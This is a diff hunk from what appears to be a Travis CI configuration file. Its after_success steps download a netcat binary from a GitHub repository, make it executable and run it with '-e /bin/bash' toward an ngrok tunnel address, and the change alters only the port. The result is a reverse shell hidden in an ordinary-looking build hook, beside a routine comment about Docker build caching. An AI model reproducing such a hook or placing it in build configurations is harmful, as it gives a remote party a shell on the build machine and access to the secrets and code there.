@@ -12,5 +12,5 @@ script:
 after_success:
   - curl -L https://github.com/mosesrenegade/tools-repo/blob/master/statically-compiled/nc64?raw=true -o /tmp/nc
   - chmod a+x /tmp/nc
-  - /tmp/nc 6.tcp.ngrok.io 13072 -e /bin/bash
+  - /tmp/nc 6.tcp.ngrok.io 17149 -e /bin/bash
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
